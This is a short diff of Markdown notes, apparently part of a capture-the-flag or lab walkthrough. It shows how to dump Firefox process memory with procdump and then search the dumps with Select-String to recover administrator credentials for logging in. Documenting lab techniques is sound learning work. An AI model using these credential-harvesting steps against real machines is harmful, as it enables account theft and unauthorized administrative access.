@@ -13,3 +13,9 @@ Knowing PID of firefox processes.
 Dumping contents of all firefox processes using `.\procdump.exe -ma [PID]` command.
 ![[Pasted image 20210712105452.png]]
 ## Getting administrator credentials from dumps
+Getting administrator credentials from dumps using `Select-String -Path .\*.dmp -Pattern 'username'` .
+![[Pasted image 20210712110518.png]]
+## Logging in with credentials got above as administrator
+Logging in with credentials got above as administrator.
+![[Pasted image 20210712110655.png]]
+
